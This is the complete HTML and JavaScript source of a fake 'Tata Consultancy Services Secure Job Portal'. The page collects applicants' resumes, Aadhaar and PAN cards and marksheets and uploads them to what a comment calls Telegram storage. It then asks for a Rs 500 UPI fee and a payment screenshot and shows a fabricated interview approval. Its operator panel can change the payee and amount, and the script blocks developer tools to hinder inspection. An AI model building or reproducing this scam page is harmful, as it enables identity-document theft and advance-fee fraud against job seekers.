<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>TCS Secure Job Portal</title>
<style>
  body {
    font-family: 'Poppins', sans-serif;
    background: #f2f6fc;
    color: #23375b;
    margin: 0; padding: 0 15px 40px;
  }
  header {
    text-align:center;
    background: linear-gradient(90deg, #09203f, #537895);
    padding: 25px 20px;
    box-shadow: 0 4px 10px rgba(12,35,75,0.3);
    color: #fff;
  }
  header h1 { margin:0; font-size:1.8em; letter-spacing:1px; }
  section {
    max-width: 720px; margin: 40px auto;
    background: white; border-radius: 10px;
    padding: 30px 35px;
    box-shadow: 0 8px 25px rgba(12,35,75,0.12);
  }
  h2 {
    color: #114b8b;
    border-left: 5px solid #014f86;
    padding-left: 12px;
    margin-bottom: 25px;
  }
  label { display:block; margin-bottom:10px; font-weight:600; }
  input[type="text"], input[type="file"], input[type="password"], input[type="number"], select {
    width:100%; padding:10px; border-radius:6px;
    border:1.5px solid #c1d4e6; font-size:1em;
  }
  button {
    background-color:#0c234b; color:white; border:none;
    padding:14px 0; width:100%; border-radius:8px;
    font-weight:700; font-size:1.05em;
    margin-top:20px; cursor:pointer; transition:0.3s;
  }
  button:hover { background-color:#014f86; transform: scale(1.02); }
  #screenshotPreview img {
    width:180px; border-radius:8px; margin-top:10px;
    box-shadow:0 2px 10px rgba(0,0,0,0.2);
  }
  footer { text-align:center; margin-top:50px; font-size:0.9em; color:#555; }
  .admin-settings { background:#eef4fc; padding:10px; border-radius:8px; margin-top:10px; }
</style>
</head>
<body>

<header>
  <h1>Tata Consultancy Services - Secure Job Portal</h1>
</header>

<!-- ====================== APPLY SECTION ======================= -->
<section id="apply-section">
  <h2>Apply for Job</h2>
  <label>Upload Resume (PDF)
    <input type="file" id="resume" accept=".pdf">
  </label>
  <label>Upload Aadhaar Card
    <input type="file" id="aadhaar" accept="image/*,.pdf">
  </label>
  <label>Upload PAN Card
    <input type="file" id="pancard" accept="image/*,.pdf">
  </label>
  <label>Upload Higher Secondary Marksheet
    <input type="file" id="hsMarksheet" accept="image/*,.pdf">
  </label>
  <label>Upload School/College Marksheet
    <input type="file" id="collegeMarksheet" accept="image/*,.pdf">
  </label>
  <label>Select Job Location:
    <select id="job-location">
      <option value="">--Select--</option>
      <option>Hyderabad</option><option>Bangalore</option>
      <option>Chennai</option><option>Pune</option>
      <option>Noida</option><option>Gujarat</option>
    </select>
  </label>
  <button id="applyBtn">Apply Now</button>
</section>

<!-- ====================== PAYMENT SECTION ======================= -->
<section id="payment-section" style="display:none;">
  <h2>Complete Payment</h2>
  <p>Amount to pay: ‚Çπ <strong id="paymentAmount">500</strong></p>
  <p>UPI ID: <strong id="upiId">tcssecure@upi</strong></p>
  <div id="qrCode"></div>
  <button id="paymentDoneBtn">Payment Completed</button>
</section>

<!-- ====================== SCREENSHOT UPLOAD ======================= -->
<section id="screenshot-section" style="display:none;">
  <h2>Upload Payment Screenshot</h2>
  <label>Select Screenshot:
    <input type="file" id="screenshot" accept="image/*">
  </label>
  <div id="screenshotPreview"></div>
  <button id="submitScreenshotBtn">Submit Screenshot</button>
</section>

<!-- ====================== PENDING ======================= -->
<section id="pending-section" style="display:none;">
  <h2>Awaiting Approval</h2>
  <p>‚úÖ Screenshot submitted successfully.</p>
  <p>‚è≥ Please wait for HR/Admin to approve your application.</p>
</section>

<!-- ====================== SUCCESS ======================= -->
<section id="success-section" style="display:none;">
  <h2>üéâ Application Approved</h2>
  <p><strong>Application ID:</strong> <span id="applicationId"></span></p>
  <p><strong>Selected Location:</strong> <span id="selectedLocation"></span></p>
  <p><strong>Interview Date:</strong> Next Month 27</p>
  <p><strong>Time:</strong> 10 AM</p>
</section>

<!-- ====================== ADMIN PANEL ======================= -->
<section id="admin-section" style="margin-top:40px;">
  <h2>HR/Admin Panel</h2>
  <label>Enter Admin Password:
    <input type="password" id="adminPass">
  </label>
  <div id="adminSettings" class="admin-settings" style="display:none;">
    <h3>üîß Update Payment Settings</h3>
    <label>Change UPI ID:
      <input type="text" id="newUpiId" placeholder="Enter new UPI ID">
    </label>
    <label>Change Amount (‚Çπ):
      <input type="number" id="newAmount" placeholder="Enter new amount">
    </label>
    <button id="updatePaymentBtn">Update Payment Info</button>
  </div>
  <button id="approveBtn">Approve Application</button>
</section>

<footer>
  <p>¬© 2025 Tata Consultancy Services | All rights reserved</p>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<script>
// =================== SECURE VARIABLES ====================
const secureHash = btoa("Sourav@1234"); // Encrypted Password
let upiId = "tcssecure@upi";
let paymentAmount = 500;
let jobLocation = "";
let screenshotUploaded = false;

const backendUrl = 'http://localhost:3001/upload'; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ Node.js ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ URL ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¨‡¶∏‡¶æ‡¶¨‡ßá‡¶®

// =================== FILE UPLOAD TO TELEGRAM STORAGE WITH COMPRESSION ====================
async function uploadFile(file, label) {
  try {
    const formData = new FormData();
    formData.append('file', file);

    const res = await fetch(backendUrl, { method: 'POST', body: formData });

    if (!res.ok) throw new Error('Failed to upload ' + label);
    const data = await res.json();
    console.log(`${label} uploaded successfully:`, data);
  } catch(error) {
    console.error(error);
    alert(`Error uploading ${label}: ${error.message}`);
  }
}

// Attach onchange handlers to file inputs for automatic upload
['resume','aadhaar','pancard','hsMarksheet','collegeMarksheet'].forEach(id => {
  document.getElementById(id).addEventListener('change', e => {
    const file = e.target.files[0];
    if (file) {
      uploadFile(file, id);
    }
  });
});

// Payment screenshot onchange handler (upload + preview)
document.getElementById('screenshot').addEventListener('change', e => {
  const file = e.target.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = (ev) => {
      document.getElementById('screenshotPreview').innerHTML = `<img src="${ev.target.result}" alt="Screenshot Preview">`;
      screenshotUploaded = true;
    };
    reader.readAsDataURL(file);

    uploadFile(file, "payment screenshot");
  }
});

// =================== APPLY ====================
document.getElementById("applyBtn").onclick = () => {
  const resume = document.getElementById("resume").files[0];
  const aadhaar = document.getElementById("aadhaar").files[0];
  const pan = document.getElementById("pancard").files[0];
  const hs = document.getElementById("hsMarksheet").files[0];
  const college = document.getElementById("collegeMarksheet").files[0];
  jobLocation = document.getElementById("job-location").value;

  if(!resume || !aadhaar || !pan || !hs || !college || !jobLocation){
    alert("‚ö†Ô∏è Please upload all required documents and select location.");
    return;
  }

  document.getElementById("apply-section").style.display="none";
  document.getElementById("payment-section").style.display="block";
  document.getElementById("paymentAmount").textContent = paymentAmount;
  document.getElementById("upiId").textContent = upiId;
  
  document.getElementById("qrCode").innerHTML = "";
  new QRCode(document.getElementById("qrCode"), {
    text:`upi://pay?pa=${upiId}&am=${paymentAmount}&cu=INR`,
    width:150, height:150
  });
};

// =================== PAYMENT DONE ====================
document.getElementById("paymentDoneBtn").onclick = ()=>{
  document.getElementById("payment-section").style.display="none";
  document.getElementById("screenshot-section").style.display="block";
};

// =================== SUBMIT SCREENSHOT ====================
document.getElementById("submitScreenshotBtn").onclick = ()=>{
  if(!screenshotUploaded){
    alert("‚ö†Ô∏è Please upload screenshot first!");
    return;
  }
  document.getElementById("screenshot-section").style.display="none";
  document.getElementById("pending-section").style.display="block";
};

// =================== ADMIN LOGIN ====================
document.getElementById("adminPass").addEventListener("input", ()=>{
  const pass = document.getElementById("adminPass").value.trim();
  const encoded = btoa(pass);
  if(encoded === secureHash){
    document.getElementById("adminSettings").style.display="block";
  } else {
    document.getElementById("adminSettings").style.display="none";
  }
});

// =================== UPDATE PAYMENT INFO ====================
document.getElementById("updatePaymentBtn").onclick = ()=>{
  const newUpi = document.getElementById("newUpiId").value.trim();
  const newAmt = parseFloat(document.getElementById("newAmount").value.trim());

  if(newUpi){
    upiId = newUpi;
    document.getElementById("upiId").textContent = upiId;
  }
  if(newAmt && newAmt > 0){
    paymentAmount = newAmt;
    document.getElementById("paymentAmount").textContent = paymentAmount;
  }

  alert("‚úÖ Payment information updated successfully!");
};

// =================== APPROVE APPLICATION ====================
document.getElementById("approveBtn").onclick = ()=>{
  const pass = document.getElementById("adminPass").value.trim();
  const encoded = btoa(pass);
  if(encoded === secureHash){
    document.getElementById("pending-section").style.display="none";
    document.getElementById("success-section").style.display="block";
    document.getElementById("applicationId").textContent = 
      "TCS" + Math.floor(100000 + Math.random() * 900000);
    document.getElementById("selectedLocation").textContent = jobLocation;
    alert("‚úÖ Application Approved Successfully!");
  } else {
    alert("‚ùå Wrong Admin Password!");
  }
};

// =================== BASIC ANTI-HACK ====================
document.addEventListener("contextmenu", e => e.preventDefault());
document.onkeydown = function(e) {
  if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode==73)) return false;
  if(e.ctrlKey && e.keyCode==85) return false;
};
</script>

</body>
</html>
